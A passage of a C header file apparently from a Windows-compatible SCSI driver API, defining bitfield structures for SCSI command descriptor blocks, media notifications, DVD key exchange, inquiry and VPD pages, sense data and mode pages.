    UCHAR OperationCode;
    UCHAR RelativeAddress:1;
    UCHAR Reserved1:1;
    UCHAR EBP:1;
    UCHAR ForceUnitAccess:1;
    UCHAR DisablePageOut:1;
    UCHAR LogicalUnitNumber:3;
    UCHAR LogicalBlock[4];
    UCHAR TransferLength[4];
    UCHAR Reserved2:7;
    UCHAR Streaming:1;
    UCHAR Control;
  } WRITE12;
  struct _ATA_PASSTHROUGH12 {
    UCHAR OperationCode;
    UCHAR Reserved1:1;
    UCHAR Protocol:4;
    UCHAR MultipleCount:3;
    UCHAR TLength:2;
    UCHAR ByteBlock:1;
    UCHAR TDir:1;
    UCHAR Reserved2:1;
    UCHAR CkCond:1;
    UCHAR Offline:2;
    UCHAR Features;
    UCHAR SectorCount;
    UCHAR LbaLow;
    UCHAR LbaMid;
    UCHAR LbaHigh;
    UCHAR Device;
    UCHAR Command;
    UCHAR Reserved3;
    UCHAR Control;
  } ATA_PASSTHROUGH12;
  struct _READ16 {
    UCHAR OperationCode;
    UCHAR Reserved1:3;
    UCHAR ForceUnitAccess:1;
    UCHAR DisablePageOut:1;
    UCHAR ReadProtect:3;
    UCHAR LogicalBlock[8];
    UCHAR TransferLength[4];
    UCHAR Reserved2:7;
    UCHAR Streaming:1;
    UCHAR Control;
  } READ16;
  struct _WRITE16 {
    UCHAR OperationCode;
    UCHAR Reserved1:3;
    UCHAR ForceUnitAccess:1;
    UCHAR DisablePageOut:1;
    UCHAR WriteProtect:3;
    UCHAR LogicalBlock[8];
    UCHAR TransferLength[4];
    UCHAR Reserved2:7;
    UCHAR Streaming:1;
    UCHAR Control;
  } WRITE16;
  struct _VERIFY16 {
    UCHAR OperationCode;
    UCHAR Reserved1:1;
    UCHAR ByteCheck:1;
    UCHAR BlockVerify:1;
    UCHAR Reserved2: 1;
    UCHAR DisablePageOut:1;
    UCHAR VerifyProtect:3;
    UCHAR LogicalBlock[8];
    UCHAR VerificationLength[4];
    UCHAR Reserved3:7;
    UCHAR Streaming:1;
    UCHAR Control;
  } VERIFY16;
  struct _SYNCHRONIZE_CACHE16 {
    UCHAR OperationCode;
    UCHAR Reserved1:1;
    UCHAR Immediate:1;
    UCHAR Reserved2:6;
    UCHAR LogicalBlock[8];
    UCHAR BlockCount[4];
    UCHAR Reserved3;
    UCHAR Control;
  } SYNCHRONIZE_CACHE16;
  struct _READ_CAPACITY16 {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR LogicalBlock[8];
    UCHAR BlockCount[4];
    UCHAR PMI:1;
    UCHAR Reserved2:7;
    UCHAR Control;
  } READ_CAPACITY16;
  struct _ATA_PASSTHROUGH16 {
    UCHAR OperationCode;
    UCHAR Extend:1;
    UCHAR Protocol:4;
    UCHAR MultipleCount:3;
    UCHAR TLength:2;
    UCHAR ByteBlock:1;
    UCHAR TDir:1;
    UCHAR Reserved1:1;
    UCHAR CkCond:1;
    UCHAR Offline:2;
    UCHAR Features15_8;
    UCHAR Features7_0;
    UCHAR SectorCount15_8;
    UCHAR SectorCount7_0;
    UCHAR LbaLow15_8;
    UCHAR LbaLow7_0;
    UCHAR LbaMid15_8;
    UCHAR LbaMid7_0;
    UCHAR LbaHigh15_8;
    UCHAR LbaHigh7_0;
    UCHAR Device;
    UCHAR Command;
    UCHAR Control;
  } ATA_PASSTHROUGH16;
  struct _GET_LBA_STATUS {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR StartingLBA[8];
    UCHAR AllocationLength[4];
    UCHAR Reserved2;
    UCHAR Control;
  } GET_LBA_STATUS;
  struct _TOKEN_OPERATION {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR Reserved2[4];
    UCHAR ListIdentifier[4];
    UCHAR ParameterListLength[4];
    UCHAR GroupNumber: 5;
    UCHAR Reserved3: 3;
    UCHAR Control;
  } TOKEN_OPERATION;
  struct _RECEIVE_TOKEN_INFORMATION {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR ListIdentifier[4];
    UCHAR Reserved2[4];
    UCHAR AllocationLength[4];
    UCHAR Reserved3;
    UCHAR Control;
  } RECEIVE_TOKEN_INFORMATION;
  struct _WRITE_BUFFER {
    UCHAR OperationCode;
    UCHAR Mode:5;
    UCHAR ModeSpecific:3;
    UCHAR BufferID;
    UCHAR BufferOffset[3];
    UCHAR ParameterListLength[3];
    UCHAR Control;
  } WRITE_BUFFER;
  struct _CLOSE_ZONE {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR ZoneId[8];
    UCHAR Reserved2[4];
    UCHAR All:1;
    UCHAR Reserved3:7;
    UCHAR Control;
  } CLOSE_ZONE;
  struct _FINISH_ZONE {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR ZoneId[8];
    UCHAR Reserved2[4];
    UCHAR All:1;
    UCHAR Reserved3:7;
    UCHAR Control;
  } FINISH_ZONE;
  struct _OPEN_ZONE {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR ZoneId[8];
    UCHAR Reserved2[4];
    UCHAR All:1;
    UCHAR Reserved3:7;
    UCHAR Control;
  } OPEN_ZONE;
  struct _RESET_WRITE_POINTER {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR ZoneId[8];
    UCHAR Reserved2[4];
    UCHAR All:1;
    UCHAR Reserved3:7;
    UCHAR Control;
  } RESET_WRITE_POINTER;
  struct _REPORT_ZONES {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR ZoneStartLBA[8];
    UCHAR AllocationLength[4];
    UCHAR ReportingOptions:6;
    UCHAR Reserved3:1;
    UCHAR Partial:1;
    UCHAR Control;
  } REPORT_ZONES;
  struct _GET_PHYSICAL_ELEMENT_STATUS {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR Reserved2[4];
    UCHAR StartingElement[4];
    UCHAR AllocationLength[4];
    UCHAR ReportType:4;
    UCHAR Reserved3:2;
    UCHAR Filter:2;
    UCHAR Control;
  } GET_PHYSICAL_ELEMENT_STATUS;
  struct _REMOVE_ELEMENT_AND_TRUNCATE {
    UCHAR OperationCode;
    UCHAR ServiceAction:5;
    UCHAR Reserved1:3;
    UCHAR RequestedCapacity[8];
    UCHAR ElementIdentifier[4];
    UCHAR Reserved2;
    UCHAR Control;
  } REMOVE_ELEMENT_AND_TRUNCATE;
  ULONG AsUlong[4];
  UCHAR AsByte[16];
} CDB, *PCDB;

typedef struct _NOTIFICATION_EVENT_STATUS_HEADER {
  UCHAR EventDataLength[2];
  UCHAR NotificationClass:3;
  UCHAR Reserved:4;
  UCHAR NEA:1;
  UCHAR SupportedEventClasses;
  UCHAR ClassEventData[0];
} NOTIFICATION_EVENT_STATUS_HEADER, *PNOTIFICATION_EVENT_STATUS_HEADER;

typedef struct _NOTIFICATION_OPERATIONAL_STATUS {
  UCHAR OperationalEvent:4;
  UCHAR Reserved1:4;
  UCHAR OperationalStatus:4;
  UCHAR Reserved2:3;
  UCHAR PersistentPrevented:1;
  UCHAR Operation[2];
} NOTIFICATION_OPERATIONAL_STATUS, *PNOTIFICATION_OPERATIONAL_STATUS;

typedef struct _NOTIFICATION_POWER_STATUS {
  UCHAR PowerEvent:4;
  UCHAR Reserved:4;
  UCHAR PowerStatus;
  UCHAR Reserved2[2];
} NOTIFICATION_POWER_STATUS, *PNOTIFICATION_POWER_STATUS;

typedef struct _NOTIFICATION_EXTERNAL_STATUS {
  UCHAR ExternalEvent:4;
  UCHAR Reserved1:4;
  UCHAR ExternalStatus:4;
  UCHAR Reserved2:3;
  UCHAR PersistentPrevented:1;
  UCHAR Request[2];
} NOTIFICATION_EXTERNAL_STATUS, *PNOTIFICATION_EXTERNAL_STATUS;

typedef struct _NOTIFICATION_MEDIA_STATUS {
  UCHAR MediaEvent:4;
  UCHAR Reserved:4;
  _ANONYMOUS_UNION union {
    UCHAR PowerStatus;
    UCHAR MediaStatus;
    _ANONYMOUS_STRUCT struct {
      UCHAR DoorTrayOpen:1;
      UCHAR MediaPresent:1;
      UCHAR ReservedX:6;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  UCHAR StartSlot;
  UCHAR EndSlot;
} NOTIFICATION_MEDIA_STATUS, *PNOTIFICATION_MEDIA_STATUS;

typedef struct _NOTIFICATION_MULTI_HOST_STATUS {
  UCHAR MultiHostEvent:4;
  UCHAR Reserved1:4;
  UCHAR MultiHostStatus:4;
  UCHAR Reserved2:3;
  UCHAR PersistentPrevented:1;
  UCHAR Priority[2];
} NOTIFICATION_MULTI_HOST_STATUS, *PNOTIFICATION_MULTI_HOST_STATUS;

typedef struct _NOTIFICATION_BUSY_STATUS {
  UCHAR DeviceBusyEvent:4;
  UCHAR Reserved:4;
  UCHAR DeviceBusyStatus;
  UCHAR Time[2];
} NOTIFICATION_BUSY_STATUS, *PNOTIFICATION_BUSY_STATUS;

typedef struct _SUPPORTED_SECURITY_PROTOCOLS_PARAMETER_DATA {
  UCHAR Reserved1[6];
  UCHAR SupportedSecurityListLength[2];
  UCHAR SupportedSecurityProtocol[0];
} SUPPORTED_SECURITY_PROTOCOLS_PARAMETER_DATA, *PSUPPORTED_SECURITY_PROTOCOLS_PARAMETER_DATA;

typedef struct _READ_DVD_STRUCTURES_HEADER {
  UCHAR Length[2];
  UCHAR Reserved[2];
  UCHAR Data[0];
} READ_DVD_STRUCTURES_HEADER, *PREAD_DVD_STRUCTURES_HEADER;

typedef struct _CDVD_KEY_HEADER {
  UCHAR DataLength[2];
  UCHAR Reserved[2];
  UCHAR Data[0];
} CDVD_KEY_HEADER, *PCDVD_KEY_HEADER;

typedef struct _CDVD_REPORT_AGID_DATA {
  UCHAR Reserved1[3];
  UCHAR Reserved2:6;
  UCHAR AGID:2;
} CDVD_REPORT_AGID_DATA, *PCDVD_REPORT_AGID_DATA;

typedef struct _CDVD_CHALLENGE_KEY_DATA {
  UCHAR ChallengeKeyValue[10];
  UCHAR Reserved[2];
} CDVD_CHALLENGE_KEY_DATA, *PCDVD_CHALLENGE_KEY_DATA;

typedef struct _CDVD_KEY_DATA {
  UCHAR Key[5];
  UCHAR Reserved[3];
} CDVD_KEY_DATA, *PCDVD_KEY_DATA;

typedef struct _CDVD_REPORT_ASF_DATA {
  UCHAR Reserved1[3];
  UCHAR Success:1;
  UCHAR Reserved2:7;
} CDVD_REPORT_ASF_DATA, *PCDVD_REPORT_ASF_DATA;

typedef struct _CDVD_TITLE_KEY_HEADER {
  UCHAR DataLength[2];
  UCHAR Reserved1[1];
  UCHAR Reserved2:3;
  UCHAR CGMS:2;
  UCHAR CP_SEC:1;
  UCHAR CPM:1;
  UCHAR Zero:1;
  CDVD_KEY_DATA TitleKey;
} CDVD_TITLE_KEY_HEADER, *PCDVD_TITLE_KEY_HEADER;

typedef struct _FORMAT_DESCRIPTOR {
  UCHAR NumberOfBlocks[4];
  UCHAR FormatSubType:2;
  UCHAR FormatType:6;
  UCHAR BlockLength[3];
} FORMAT_DESCRIPTOR, *PFORMAT_DESCRIPTOR;

typedef struct _FORMAT_LIST_HEADER {
  UCHAR Reserved;
  UCHAR VendorSpecific:1;
  UCHAR Immediate:1;
  UCHAR TryOut:1;
  UCHAR IP:1;
  UCHAR STPF:1;
  UCHAR DCRT:1;
  UCHAR DPRY:1;
  UCHAR FOV:1;
  UCHAR FormatDescriptorLength[2];
  FORMAT_DESCRIPTOR Descriptors[0];
} FORMAT_LIST_HEADER, *PFORMAT_LIST_HEADER;

typedef struct _FORMATTED_CAPACITY_DESCRIPTOR {
  UCHAR NumberOfBlocks[4];
  UCHAR Maximum:1;
  UCHAR Valid:1;
  UCHAR FormatType:6;
  UCHAR BlockLength[3];
} FORMATTED_CAPACITY_DESCRIPTOR, *PFORMATTED_CAPACITY_DESCRIPTOR;

typedef struct _FORMATTED_CAPACITY_LIST {
  UCHAR Reserved[3];
  UCHAR CapacityListLength;
  FORMATTED_CAPACITY_DESCRIPTOR Descriptors[0];
} FORMATTED_CAPACITY_LIST, *PFORMATTED_CAPACITY_LIST;

typedef struct _OPC_TABLE_ENTRY {
  UCHAR Speed[2];
  UCHAR OPCValue[6];
} OPC_TABLE_ENTRY, *POPC_TABLE_ENTRY;

typedef struct _DISC_INFORMATION {
  UCHAR Length[2];
  UCHAR DiscStatus:2;
  UCHAR LastSessionStatus:2;
  UCHAR Erasable:1;
  UCHAR Reserved1:3;
  UCHAR FirstTrackNumber;
  UCHAR NumberOfSessionsLsb;
  UCHAR LastSessionFirstTrackLsb;
  UCHAR LastSessionLastTrackLsb;
  UCHAR MrwStatus:2;
  UCHAR MrwDirtyBit:1;
  UCHAR Reserved2:2;
  UCHAR URU:1;
  UCHAR DBC_V:1;
  UCHAR DID_V:1;
  UCHAR DiscType;
  UCHAR NumberOfSessionsMsb;
  UCHAR LastSessionFirstTrackMsb;
  UCHAR LastSessionLastTrackMsb;
  UCHAR DiskIdentification[4];
  UCHAR LastSessionLeadIn[4];
  UCHAR LastPossibleLeadOutStartTime[4];
  UCHAR DiskBarCode[8];
  UCHAR Reserved4;
  UCHAR NumberOPCEntries;
  OPC_TABLE_ENTRY OPCTable[1];
} DISC_INFORMATION, *PDISC_INFORMATION;

typedef struct _DISK_INFORMATION {
  UCHAR Length[2];
  UCHAR DiskStatus:2;
  UCHAR LastSessionStatus:2;
  UCHAR Erasable:1;
  UCHAR Reserved1:3;
  UCHAR FirstTrackNumber;
  UCHAR NumberOfSessions;
  UCHAR LastSessionFirstTrack;
  UCHAR LastSessionLastTrack;
  UCHAR Reserved2:5;
  UCHAR GEN:1;
  UCHAR DBC_V:1;
  UCHAR DID_V:1;
  UCHAR DiskType;
  UCHAR Reserved3[3];
  UCHAR DiskIdentification[4];
  UCHAR LastSessionLeadIn[4];
  UCHAR LastPossibleStartTime[4];
  UCHAR DiskBarCode[8];
  UCHAR Reserved4;
  UCHAR NumberOPCEntries;
  OPC_TABLE_ENTRY OPCTable[0];
} DISK_INFORMATION, *PDISK_INFORMATION;

typedef struct _DATA_BLOCK_HEADER {
  UCHAR DataMode;
  UCHAR Reserved[4];
  _ANONYMOUS_UNION union {
    UCHAR LogicalBlockAddress[4];
    struct {
      UCHAR Reserved;
      UCHAR M;
      UCHAR S;
      UCHAR F;
    } MSF;
  } DUMMYUNIONNAME;
} DATA_BLOCK_HEADER, *PDATA_BLOCK_HEADER;

typedef struct _TRACK_INFORMATION {
  UCHAR Length[2];
  UCHAR TrackNumber;
  UCHAR SessionNumber;
  UCHAR Reserved1;
  UCHAR TrackMode:4;
  UCHAR Copy:1;
  UCHAR Damage:1;
  UCHAR Reserved2:2;
  UCHAR DataMode:4;
  UCHAR FP:1;
  UCHAR Packet:1;
  UCHAR Blank:1;
  UCHAR RT:1;
  UCHAR NWA_V:1;
  UCHAR Reserved3:7;
  UCHAR TrackStartAddress[4];
  UCHAR NextWritableAddress[4];
  UCHAR FreeBlocks[4];
  UCHAR FixedPacketSize[4];
} TRACK_INFORMATION, *PTRACK_INFORMATION;

typedef struct _TRACK_INFORMATION2 {
  UCHAR Length[2];
  UCHAR TrackNumberLsb;
  UCHAR SessionNumberLsb;
  UCHAR Reserved4;
  UCHAR TrackMode:4;
  UCHAR Copy:1;
  UCHAR Damage:1;
  UCHAR Reserved5:2;
  UCHAR DataMode:4;
  UCHAR FixedPacket:1;
  UCHAR Packet:1;
  UCHAR Blank:1;
  UCHAR ReservedTrack:1;
  UCHAR NWA_V:1;
  UCHAR LRA_V:1;
  UCHAR Reserved6:6;
  UCHAR TrackStartAddress[4];
  UCHAR NextWritableAddress[4];
  UCHAR FreeBlocks[4];
  UCHAR FixedPacketSize[4];
  UCHAR TrackSize[4];
  UCHAR LastRecordedAddress[4];
  UCHAR TrackNumberMsb;
  UCHAR SessionNumberMsb;
  UCHAR Reserved7[2];
} TRACK_INFORMATION2, *PTRACK_INFORMATION2;

typedef struct _TRACK_INFORMATION3 {
  UCHAR Length[2];
  UCHAR TrackNumberLsb;
  UCHAR SessionNumberLsb;
  UCHAR Reserved4;
  UCHAR TrackMode:4;
  UCHAR Copy:1;
  UCHAR Damage:1;
  UCHAR Reserved5:2;
  UCHAR DataMode:4;
  UCHAR FixedPacket:1;
  UCHAR Packet:1;
  UCHAR Blank:1;
  UCHAR ReservedTrack:1;
  UCHAR NWA_V:1;
  UCHAR LRA_V:1;
  UCHAR Reserved6:6;
  UCHAR TrackStartAddress[4];
  UCHAR NextWritableAddress[4];
  UCHAR FreeBlocks[4];
  UCHAR FixedPacketSize[4];
  UCHAR TrackSize[4];
  UCHAR LastRecordedAddress[4];
  UCHAR TrackNumberMsb;
  UCHAR SessionNumberMsb;
  UCHAR Reserved7[2];
  UCHAR ReadCompatibilityLba[4];
} TRACK_INFORMATION3, *PTRACK_INFORMATION3;

typedef struct _PERFORMANCE_DESCRIPTOR {
  UCHAR RandomAccess:1;
  UCHAR Exact:1;
  UCHAR RestoreDefaults:1;
  UCHAR WriteRotationControl:2;
  UCHAR Reserved1:3;
  UCHAR Reserved[3];
  UCHAR StartLba[4];
  UCHAR EndLba[4];
  UCHAR ReadSize[4];
  UCHAR ReadTime[4];
  UCHAR WriteSize[4];
  UCHAR WriteTime[4];
} PERFORMANCE_DESCRIPTOR, *PPERFORMANCE_DESCRIPTOR;

typedef struct _SCSI_EXTENDED_MESSAGE {
  UCHAR InitialMessageCode;
  UCHAR MessageLength;
  UCHAR MessageType;
  union _EXTENDED_ARGUMENTS {
    struct {
      UCHAR Modifier[4];
    } Modify;
    struct {
      UCHAR TransferPeriod;
      UCHAR ReqAckOffset;
    } Synchronous;
    struct{
      UCHAR Width;
    } Wide;
  } ExtendedArguments;
}SCSI_EXTENDED_MESSAGE, *PSCSI_EXTENDED_MESSAGE;

#ifndef _INQUIRYDATA_DEFINED /* also in minitape.h */
#define _INQUIRYDATA_DEFINED

#define INQUIRYDATABUFFERSIZE 36

#if (NTDDI_VERSION < NTDDI_WINXP)
typedef struct _INQUIRYDATA {
  UCHAR DeviceType:5;
  UCHAR DeviceTypeQualifier:3;
  UCHAR DeviceTypeModifier:7;
  UCHAR RemovableMedia:1;
  UCHAR Versions;
  UCHAR ResponseDataFormat:4;
  UCHAR HiSupport:1;
  UCHAR NormACA:1;
  UCHAR ReservedBit:1;
  UCHAR AERC:1;
  UCHAR AdditionalLength;
  UCHAR Reserved[2];
  UCHAR SoftReset:1;
  UCHAR CommandQueue:1;
  UCHAR Reserved2:1;
  UCHAR LinkedCommands:1;
  UCHAR Synchronous:1;
  UCHAR Wide16Bit:1;
  UCHAR Wide32Bit:1;
  UCHAR RelativeAddressing:1;
  UCHAR VendorId[8];
  UCHAR ProductId[16];
  UCHAR ProductRevisionLevel[4];
  UCHAR VendorSpecific[20];
  UCHAR Reserved3[40];
} INQUIRYDATA, *PINQUIRYDATA;
#else
typedef struct _INQUIRYDATA {
  UCHAR DeviceType:5;
  UCHAR DeviceTypeQualifier:3;
  UCHAR DeviceTypeModifier:7;
  UCHAR RemovableMedia:1;
  _ANONYMOUS_UNION union {
    UCHAR Versions;
    _ANONYMOUS_STRUCT struct {
      UCHAR ANSIVersion:3;
      UCHAR ECMAVersion:3;
      UCHAR ISOVersion:2;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  UCHAR ResponseDataFormat:4;
  UCHAR HiSupport:1;
  UCHAR NormACA:1;
  UCHAR TerminateTask:1;
  UCHAR AERC:1;
  UCHAR AdditionalLength;
  UCHAR Reserved;
  UCHAR Addr16:1;
  UCHAR Addr32:1;
  UCHAR AckReqQ:1;
  UCHAR MediumChanger:1;
  UCHAR MultiPort:1;
  UCHAR ReservedBit2:1;
  UCHAR EnclosureServices:1;
  UCHAR ReservedBit3:1;
  UCHAR SoftReset:1;
  UCHAR CommandQueue:1;
  UCHAR TransferDisable:1;
  UCHAR LinkedCommands:1;
  UCHAR Synchronous:1;
  UCHAR Wide16Bit:1;
  UCHAR Wide32Bit:1;
  UCHAR RelativeAddressing:1;
  UCHAR VendorId[8];
  UCHAR ProductId[16];
  UCHAR ProductRevisionLevel[4];
  UCHAR VendorSpecific[20];
  UCHAR Reserved3[40];
} INQUIRYDATA, *PINQUIRYDATA;
#endif /* (NTDDI_VERSION < NTDDI_WINXP) */

#endif /* _INQUIRYDATA_DEFINED */

typedef struct _VPD_MEDIA_SERIAL_NUMBER_PAGE {
  UCHAR DeviceType:5;
  UCHAR DeviceTypeQualifier:3;
  UCHAR PageCode;
  UCHAR Reserved;
  UCHAR PageLength;
  UCHAR SerialNumber[0];
} VPD_MEDIA_SERIAL_NUMBER_PAGE, *PVPD_MEDIA_SERIAL_NUMBER_PAGE;

typedef struct _VPD_SERIAL_NUMBER_PAGE {
  UCHAR DeviceType:5;
  UCHAR DeviceTypeQualifier:3;
  UCHAR PageCode;
  UCHAR Reserved;
  UCHAR PageLength;
  UCHAR SerialNumber[0];
} VPD_SERIAL_NUMBER_PAGE, *PVPD_SERIAL_NUMBER_PAGE;

typedef enum _VPD_CODE_SET {
  VpdCodeSetReserved = 0,
  VpdCodeSetBinary = 1,
  VpdCodeSetAscii = 2,
  VpdCodeSetUTF8 = 3
} VPD_CODE_SET, *PVPD_CODE_SET;

typedef enum _VPD_ASSOCIATION {
  VpdAssocDevice = 0,
  VpdAssocPort = 1,
  VpdAssocTarget = 2,
  VpdAssocReserved1 = 3,
  VpdAssocReserved2 = 4
} VPD_ASSOCIATION, *PVPD_ASSOCIATION;

typedef enum _VPD_IDENTIFIER_TYPE {
  VpdIdentifierTypeVendorSpecific = 0,
  VpdIdentifierTypeVendorId = 1,
  VpdIdentifierTypeEUI64 = 2,
  VpdIdentifierTypeFCPHName = 3,
  VpdIdentifierTypePortRelative = 4,
  VpdIdentifierTypeTargetPortGroup = 5,
  VpdIdentifierTypeLogicalUnitGroup = 6,
  VpdIdentifierTypeMD5LogicalUnitId = 7,
  VpdIdentifierTypeSCSINameString = 8
} VPD_IDENTIFIER_TYPE, *PVPD_IDENTIFIER_TYPE;

typedef struct _VPD_IDENTIFICATION_DESCRIPTOR {
  UCHAR CodeSet:4;
  UCHAR Reserved:4;
  UCHAR IdentifierType:4;
  UCHAR Association:2;
  UCHAR Reserved2:2;
  UCHAR Reserved3;
  UCHAR IdentifierLength;
  UCHAR Identifier[0];
} VPD_IDENTIFICATION_DESCRIPTOR, *PVPD_IDENTIFICATION_DESCRIPTOR;

typedef struct _VPD_IDENTIFICATION_PAGE {
  UCHAR DeviceType:5;
  UCHAR DeviceTypeQualifier:3;
  UCHAR PageCode;
  UCHAR Reserved;
  UCHAR PageLength;
  UCHAR Descriptors[0];
} VPD_IDENTIFICATION_PAGE, *PVPD_IDENTIFICATION_PAGE;

typedef struct _VPD_SUPPORTED_PAGES_PAGE {
  UCHAR DeviceType:5;
  UCHAR DeviceTypeQualifier:3;
  UCHAR PageCode;
  UCHAR Reserved;
  UCHAR PageLength;
  UCHAR SupportedPageList[0];
} VPD_SUPPORTED_PAGES_PAGE, *PVPD_SUPPORTED_PAGES_PAGE;

typedef struct _PRI_REGISTRATION_LIST {
  UCHAR Generation[4];
  UCHAR AdditionalLength[4];
  UCHAR ReservationKeyList[0][8];
} PRI_REGISTRATION_LIST, *PPRI_REGISTRATION_LIST;

typedef struct _PRI_RESERVATION_DESCRIPTOR {
  UCHAR ReservationKey[8];
  UCHAR ScopeSpecificAddress[4];
  UCHAR Reserved;
  UCHAR Type:4;
  UCHAR Scope:4;
  UCHAR Obsolete[2];
} PRI_RESERVATION_DESCRIPTOR, *PPRI_RESERVATION_DESCRIPTOR;

typedef struct _PRI_RESERVATION_LIST {
  UCHAR Generation[4];
  UCHAR AdditionalLength[4];
  PRI_RESERVATION_DESCRIPTOR Reservations[0];
} PRI_RESERVATION_LIST, *PPRI_RESERVATION_LIST;

typedef struct _PRO_PARAMETER_LIST {
  UCHAR ReservationKey[8];
  UCHAR ServiceActionReservationKey[8];
  UCHAR ScopeSpecificAddress[4];
  UCHAR ActivatePersistThroughPowerLoss:1;
  UCHAR Reserved1:7;
  UCHAR Reserved2;
  UCHAR Obsolete[2];
} PRO_PARAMETER_LIST, *PPRO_PARAMETER_LIST;

typedef struct _SENSE_DATA {
  UCHAR ErrorCode:7;
  UCHAR Valid:1;
  UCHAR SegmentNumber;
  UCHAR SenseKey:4;
  UCHAR Reserved:1;
  UCHAR IncorrectLength:1;
  UCHAR EndOfMedia:1;
  UCHAR FileMark:1;
  UCHAR Information[4];
  UCHAR AdditionalSenseLength;
  UCHAR CommandSpecificInformation[4];
  UCHAR AdditionalSenseCode;
  UCHAR AdditionalSenseCodeQualifier;
  UCHAR FieldReplaceableUnitCode;
  UCHAR SenseKeySpecific[3];
} SENSE_DATA, *PSENSE_DATA;

/* Read Capacity Data. Returned in Big Endian format */
typedef struct _READ_CAPACITY_DATA {
  ULONG LogicalBlockAddress;
  ULONG BytesPerBlock;
} READ_CAPACITY_DATA, *PREAD_CAPACITY_DATA;

typedef struct _READ_CAPACITY_DATA_EX {
  LARGE_INTEGER LogicalBlockAddress;
  ULONG BytesPerBlock;
} READ_CAPACITY_DATA_EX, *PREAD_CAPACITY_DATA_EX;

/* Read Block Limits Data. Returned in Big Endian format */
typedef struct _READ_BLOCK_LIMITS {
  UCHAR Reserved;
  UCHAR BlockMaximumSize[3];
  UCHAR BlockMinimumSize[2];
} READ_BLOCK_LIMITS_DATA, *PREAD_BLOCK_LIMITS_DATA;

typedef struct _READ_BUFFER_CAPACITY_DATA {
  UCHAR DataLength[2];
  UCHAR Reserved1;
  UCHAR BlockDataReturned:1;
  UCHAR Reserved4:7;
  UCHAR TotalBufferSize[4];
  UCHAR AvailableBufferSize[4];
} READ_BUFFER_CAPACITY_DATA, *PREAD_BUFFER_CAPACITY_DATA;

typedef struct _MODE_PARAMETER_HEADER {
  UCHAR ModeDataLength;
  UCHAR MediumType;
  UCHAR DeviceSpecificParameter;
  UCHAR BlockDescriptorLength;
} MODE_PARAMETER_HEADER, *PMODE_PARAMETER_HEADER;

typedef struct _MODE_PARAMETER_HEADER10 {
  UCHAR ModeDataLength[2];
  UCHAR MediumType;
  UCHAR DeviceSpecificParameter;
  UCHAR Reserved[2];
  UCHAR BlockDescriptorLength[2];
} MODE_PARAMETER_HEADER10, *PMODE_PARAMETER_HEADER10;

typedef struct _MODE_PARAMETER_BLOCK {
  UCHAR DensityCode;
  UCHAR NumberOfBlocks[3];
  UCHAR Reserved;
  UCHAR BlockLength[3];
} MODE_PARAMETER_BLOCK, *PMODE_PARAMETER_BLOCK;

typedef struct _MODE_DISCONNECT_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR BufferFullRatio;
  UCHAR BufferEmptyRatio;
  UCHAR BusInactivityLimit[2];
  UCHAR BusDisconnectTime[2];
  UCHAR BusConnectTime[2];
  UCHAR MaximumBurstSize[2];
  UCHAR DataTransferDisconnect:2;
  UCHAR Reserved2[3];
} MODE_DISCONNECT_PAGE, *PMODE_DISCONNECT_PAGE;

typedef struct _MODE_CACHING_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR ReadDisableCache:1;
  UCHAR MultiplicationFactor:1;
  UCHAR WriteCacheEnable:1;
  UCHAR Reserved2:5;
  UCHAR WriteRetensionPriority:4;
  UCHAR ReadRetensionPriority:4;
  UCHAR DisablePrefetchTransfer[2];
  UCHAR MinimumPrefetch[2];
  UCHAR MaximumPrefetch[2];
  UCHAR MaximumPrefetchCeiling[2];
} MODE_CACHING_PAGE, *PMODE_CACHING_PAGE;

typedef struct _MODE_CDROM_WRITE_PARAMETERS_PAGE2 {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR WriteType:4;
  UCHAR TestWrite:1;
  UCHAR LinkSizeValid:1;
  UCHAR BufferUnderrunFreeEnabled:1;
  UCHAR Reserved2:1;
  UCHAR TrackMode:4;
  UCHAR Copy:1;
  UCHAR FixedPacket:1;
  UCHAR MultiSession:2;
  UCHAR DataBlockType:4;
  UCHAR Reserved3:4;
  UCHAR LinkSize;
  UCHAR Reserved4;
  UCHAR HostApplicationCode:6;
  UCHAR Reserved5:2;
  UCHAR SessionFormat;
  UCHAR Reserved6;
  UCHAR PacketSize[4];
  UCHAR AudioPauseLength[2];
  UCHAR MediaCatalogNumber[16];
  UCHAR ISRC[16];
  UCHAR SubHeaderData[4];
} MODE_CDROM_WRITE_PARAMETERS_PAGE2, *PMODE_CDROM_WRITE_PARAMETERS_PAGE2;

typedef struct _MODE_MRW_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR Reserved1;
  UCHAR LbaSpace:1;
  UCHAR Reserved2:7;
  UCHAR Reserved3[4];
} MODE_MRW_PAGE, *PMODE_MRW_PAGE;

typedef struct _MODE_FLEXIBLE_DISK_PAGE {
  UCHAR PageCode:6;
  UCHAR Reserved:1;
  UCHAR PageSavable:1;
  UCHAR PageLength;
  UCHAR TransferRate[2];
  UCHAR NumberOfHeads;
  UCHAR SectorsPerTrack;
  UCHAR BytesPerSector[2];
  UCHAR NumberOfCylinders[2];
  UCHAR StartWritePrecom[2];
  UCHAR StartReducedCurrent[2];
  UCHAR StepRate[2];
  UCHAR StepPluseWidth;
  UCHAR HeadSettleDelay[2];
